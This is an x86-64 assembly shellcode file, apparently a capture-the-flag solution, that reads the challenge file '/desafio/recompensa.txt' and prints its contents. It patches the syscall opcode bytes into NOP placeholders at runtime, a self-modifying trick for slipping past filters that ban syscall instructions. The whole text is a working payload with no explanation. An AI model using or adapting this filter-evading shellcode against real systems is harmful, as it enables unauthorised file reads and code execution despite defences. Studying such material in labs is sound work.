.intel_syntax noprefix
.global _start

.section .text

_start:
    jmp filename

open_file:
    pop rdi

    call base_ref
base_ref:
    pop rbp

    mov dx, 0x050e
    inc dx

    lea rax, [rbp + sc1 - base_ref]
    mov word ptr [rax], dx
    lea rax, [rbp + sc2 - base_ref]
    mov word ptr [rax], dx
    lea rax, [rbp + sc3 - base_ref]
    mov word ptr [rax], dx
    lea rax, [rbp + sc4 - base_ref]
    mov word ptr [rax], dx

    xor esi, esi
    xor edx, edx
    mov eax, 2
sc1:
    .byte 0x90, 0x90

    mov r8d, eax
    sub rsp, 256

    mov edi, r8d
    mov rsi, rsp
    mov edx, 256
    xor eax, eax
sc2:
    .byte 0x90, 0x90

    mov edx, eax
    mov edi, 1
    mov rsi, rsp
    mov eax, 1
sc3:
    .byte 0x90, 0x90

    mov eax, 60
    xor edi, edi
sc4:
    .byte 0x90, 0x90

filename:
    call open_file
    .string "/desafio/recompensa.txt"